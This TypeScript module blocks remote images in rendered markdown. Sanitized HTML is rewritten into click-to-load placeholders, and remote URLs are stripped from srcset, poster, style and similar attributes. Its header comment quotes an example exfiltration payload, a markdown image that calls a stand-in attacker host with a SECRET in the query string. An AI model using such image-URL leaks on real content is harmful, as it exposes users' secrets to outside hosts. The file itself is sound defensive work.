/**
 * Remote images in rendered markdown load only when clicked (merged plan
 * slice 1, reviews A·S3 / B·F13).
 *
 * WHY: an agent reply, a synced Notion page, a note or a web clip can carry
 * `![](https://attacker/?q=SECRET)` or a raw `<img src=…>`. DOMPurify's HTML
 * profile keeps both, and the main window used to allow `img-src https:`, so
 * the request fired the moment the text rendered — in every permission mode,
 * plan included. The CSP no longer allows remote images at all (that is the
 * backstop); this module turns each one into a placeholder that names its
 * host, and the click fetches the bytes through the backend
 * (`fetch_remote_image`, `remote_image.rs`) as a `data:` URL.
 *
 * Pure and DOM-free so it runs under vitest's node environment. It rewrites
 * DOMPurify's OUTPUT, which the browser has already parsed and re-serialized
 * (attributes double-quoted, `"` and `&` escaped), so the small start-tag
 * tokenizer below only ever sees canonical markup. It still follows the HTML
 * tokenizer's rules for quotes, `/` and raw-text elements so that hand-written
 * input (the unit tests) is read the way a browser would read it.
 */

export type ImageUrlKind =
  /** data:, blob:, or a relative path (the app's own origin) — renders as today. */
  | { kind: 'local' }
  /** http(s) or protocol-relative: a placeholder until the user clicks. */
  | { kind: 'remote'; url: string; host: string }
  /** Any other scheme (file:, javascript:, tauri:…): dropped. */
  | { kind: 'blocked' };

/** Classify an image URL the way the browser's URL parser would read it. */
export function classifyImageUrl(raw: string): ImageUrlKind {
  // The URL parser drops tab/newline anywhere and C0 controls/space at the
  // ends, so `\nhttps://x` and ` //x` must not pass as relative paths.
  const v = raw.replace(/[\t\n\r]/g, '').replace(/^[\x00-\x20]+|[\x00-\x20]+$/g, '');
  if (!v) return { kind: 'local' };
  const scheme = /^([a-zA-Z][a-zA-Z0-9+.-]*):/.exec(v);
  if (scheme) {
    const s = scheme[1].toLowerCase();
    if (s === 'data' || s === 'blob') return { kind: 'local' };
    if (s === 'http' || s === 'https') return remote(v);
    return { kind: 'blocked' };
  }
  // `//host/x` (either slash direction — `\` counts as `/` for http) takes
  // the page's scheme: a remote host, not a path. Load it over https.
  if (/^[/\\]{2}/.test(v)) return remote(`https:${v.replace(/\\/g, '/')}`);
  return { kind: 'local' };
}

function remote(v: string): ImageUrlKind {
  try {
    const u = new URL(v);
    // `hostname` is punycode for IDNs, so a look-alike host can't pose as
    // another in the placeholder label.
    return u.hostname ? { kind: 'remote', url: u.href, host: u.hostname } : { kind: 'blocked' };
  } catch {
    return { kind: 'blocked' };
  }
}

/** The URLs of a `srcset` (descriptors dropped), per the HTML spec's parser. */
export function srcsetUrls(value: string): string[] {
  const out: string[] = [];
  const ws = (c: string) => c === ' ' || c === '\t' || c === '\n' || c === '\r' || c === '\f';
  let i = 0;
  while (i < value.length) {
    while (i < value.length && (ws(value[i]) || value[i] === ',')) i++;
    if (i >= value.length) break;
    const start = i;
    while (i < value.length && !ws(value[i])) i++;
    const url = value.slice(start, i);
    if (url.endsWith(',')) { out.push(url.replace(/,+$/, '')); continue; }
    out.push(url);
    // Skip the descriptors up to the next top-level comma.
    let paren = false;
    while (i < value.length) {
      const c = value[i++];
      if (c === '(') paren = true;
      else if (c === ')') paren = false;
      else if (c === ',' && !paren) break;
    }
  }
  return out;
}

/**
 * A `style` attribute with every remote `url(…)` replaced by `none`, or null
 * to drop the attribute: CSS escapes (`u\72l(`) and the image functions that
 * take bare strings (`image-set("…")`) can't be read reliably here, so their
 * presence drops the whole declaration block.
 */
export function neutralizeStyle(css: string): string | null {
  if (css.includes('\\') || /(?:image-set|image|cross-fade|element|src)\s*\(/i.test(css)) return null;
  const out = css.replace(/url\(\s*(?:"([^"]*)"|'([^']*)'|([^)]*?))\s*\)/gi, (m, dq?: string, sq?: string, bare?: string) =>
    classifyImageUrl(dq ?? sq ?? bare ?? '').kind === 'local' ? m : 'none');
  // An unterminated or nested url( the pattern couldn't close: drop it all.
  const leftover = out.replace(/url\(\s*(?:"[^"]*"|'[^']*'|[^)]*?)\s*\)/gi, '');
  return /url\s*\(/i.test(leftover) ? null : out;
}

// ── Tokenizer ────────────────────────────────────────────────────────

interface Attr { name: string; value: string }
interface Tag { name: string; attrs: Attr[]; end: number }

const NAMED: Record<string, string> = {
  amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", nbsp: ' ',
  colon: ':', sol: '/', bsol: '\\', lpar: '(', rpar: ')', comma: ',', period: '.', tab: '\t', newline: '\n',
};

function decodeEntities(s: string): string {
  return s.replace(/&(#[xX][0-9a-fA-F]+|#[0-9]+|[a-zA-Z][a-zA-Z0-9]*);?/g, (m, e: string) => {
    if (e[0] === '#') {
      const code = e[1] === 'x' || e[1] === 'X' ? parseInt(e.slice(2), 16) : parseInt(e.slice(1), 10);
      return code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : '�';
    }
    return NAMED[e.toLowerCase()] ?? m;
  });
}

const escAttr = (s: string) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
const escText = (s: string) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

const isWs = (c: string | undefined) => c === ' ' || c === '\t' || c === '\n' || c === '\r' || c === '\f';

/** Read a tag starting at `html[at] === '<'` (or `'/'` for an end tag). */
function readTag(html: string, at: number): Tag | null {
  let i = at + 1;
  const n = html.length;
  const nameStart = i;
  while (i < n && !isWs(html[i]) && html[i] !== '/' && html[i] !== '>') i++;
  const name = html.slice(nameStart, i).toLowerCase();
  const attrs: Attr[] = [];
  const seen = new Set<string>();
  for (;;) {
    while (i < n && (isWs(html[i]) || html[i] === '/')) i++;
    if (i >= n) return null; // EOF inside a tag: the browser drops it
    if (html[i] === '>') return { name, attrs, end: i + 1 };
    const ns = i++; // the first character is part of the name, even `=`
    while (i < n && !isWs(html[i]) && html[i] !== '/' && html[i] !== '>' && html[i] !== '=') i++;
    const attrName = html.slice(ns, i).toLowerCase();
    while (i < n && isWs(html[i])) i++;
    let value = '';
    if (html[i] === '=') {
      i++;
      while (i < n && isWs(html[i])) i++;
      const q = html[i];
      if (q === '"' || q === "'") {
        const close = html.indexOf(q, i + 1);
        if (close < 0) return null;
        value = html.slice(i + 1, close);
        i = close + 1;
      } else {
        const vs = i;
        while (i < n && !isWs(html[i]) && html[i] !== '>') i++;
        value = html.slice(vs, i);
      }
    }
    // A repeated attribute is ignored by the browser; ignore it here too.
    if (!seen.has(attrName)) { seen.add(attrName); attrs.push({ name: attrName, value: decodeEntities(value) }); }
  }
}

/** Elements whose content is raw text: a `<img` inside is not a tag. */
const RAW_TEXT = new Set(['style', 'script', 'textarea', 'title', 'xmp', 'iframe', 'noembed', 'noframes', 'noscript']);
/** Attributes that make the browser fetch an image (or other media) on render. */
const FETCH_ATTRS = new Set(['src', 'srcset', 'poster', 'background', 'lowsrc', 'dynsrc']);

function attrUrls(a: Attr): string[] {
  return a.name === 'srcset' ? srcsetUrls(a.value) : [a.value];
}
const allLocal = (a: Attr) => attrUrls(a).every(u => classifyImageUrl(u).kind === 'local');

/** The click-to-load placeholder for one remote image. */
export function remoteImagePlaceholder(url: string, host: string, alt: string): string {
  return `<button type="button" class="md-remote-img" data-image-url="${escAttr(url)}" data-alt="${escAttr(alt)}" title="${escAttr(`Load ${url}`)}">`
    + (alt ? `<span class="md-remote-img-alt">${escText(alt)}</span>` : '')
    + `<span class="md-remote-img-label">Image from ${escText(host)} — Load</span></button>`;
}

const serialize = (name: string, attrs: Attr[]) =>
  `<${name}${attrs.map(a => ` ${a.name}="${escAttr(a.value)}"`).join('')}>`;

/** A rewritten start tag, or null when it needs no change. */
function rewriteTag(tag: Tag, loaded?: (url: string) => string | undefined): string | null {
  let changed = false;
  const attrs: Attr[] = [];
  for (const a of tag.attrs) {
    if (a.name === 'style') {
      const v = neutralizeStyle(a.value);
      if (v !== a.value) changed = true;
      if (v !== null) attrs.push({ name: 'style', value: v });
    } else attrs.push(a);
  }

  if (tag.name === 'img' || tag.name === 'image') {
    const src = attrs.find(a => a.name === 'src');
    const srcKind = src ? classifyImageUrl(src.value) : null;
    let target = srcKind?.kind === 'remote' ? srcKind : null;
    if (!target && srcKind?.kind !== 'local') {
      // No usable src: a remote srcset candidate is what would load.
      const set = attrs.find(a => a.name === 'srcset');
      for (const u of set ? srcsetUrls(set.value) : []) {
        const k = classifyImageUrl(u);
        if (k.kind === 'remote') { target = k; break; }
      }
    }
    if (target) {
      const alt = attrs.find(a => a.name === 'alt')?.value ?? '';
      const data = loaded?.(target.url);
      if (data && /^data:image\//i.test(data)) {
        // Already loaded through the backend this session: show the bytes.
        const keep = attrs.filter(a => !FETCH_ATTRS.has(a.name) && a.name !== 'sizes');
        return serialize('img', [{ name: 'src', value: data }, ...keep]);
      }
      return remoteImagePlaceholder(target.url, target.host, alt);
    }
  }

  // Everything else keeps its fetch attributes only while they stay local:
  // `<source srcset>`, `<video poster>`, `<input type=image src>`,
  // `<td background>`, and a local `<img src>` with a remote srcset.
  const kept = attrs.filter(a => !FETCH_ATTRS.has(a.name) || allLocal(a));
  if (kept.length !== attrs.length) changed = true;
  return changed ? serialize(tag.name, kept) : null;
}

function rawTextEnd(html: string, from: number, name: string): number {
  const lower = html.toLowerCase();
  let i = from;
  for (;;) {
    const at = lower.indexOf(`</${name}`, i);
    if (at < 0) return html.length;
    const c = html[at + 2 + name.length];
    if (c === undefined || isWs(c) || c === '/' || c === '>') return at;
    i = at + 1;
  }
}

/**
 * Replace every remote image in sanitized HTML with a click-to-load
 * placeholder, and strip remote URLs from every other fetching attribute and
 * from inline styles. `loaded(url)` returns a `data:image/…` URL the user has
 * already loaded, which renders in place of the placeholder.
 */
export function blockRemoteImages(html: string, loaded?: (url: string) => string | undefined): string {
  let out = '';
  let last = 0;
  let i = 0;
  while (i < html.length) {
    const lt = html.indexOf('<', i);
    if (lt < 0) break;
    if (html.startsWith('<!--', lt)) {
      const e = html.indexOf('-->', lt + 4);
      i = e < 0 ? html.length : e + 3;
      continue;
    }
    const next = html[lt + 1];
    if (next === '/' && /[a-zA-Z]/.test(html[lt + 2] ?? '')) {
      // End tags tokenize attributes too (then ignore them); skip quoted `>`.
      const t = readTag(html, lt + 1);
      i = t ? t.end : html.length;
      continue;
    }
    if (next === '!' || next === '?' || next === '/') {
      const e = html.indexOf('>', lt);
      i = e < 0 ? html.length : e + 1;
      continue;
    }
    if (!/[a-zA-Z]/.test(next ?? '')) { i = lt + 1; continue; }
    const tag = readTag(html, lt);
    if (!tag) break;
    const rewritten = rewriteTag(tag, loaded);
    if (rewritten !== null) {
      out += html.slice(last, lt) + rewritten;
      last = tag.end;
    }
    i = tag.end;
    if (tag.name === 'plaintext') break;
    if (RAW_TEXT.has(tag.name)) i = rawTextEnd(html, i, tag.name);
  }
  return out + html.slice(last);
}
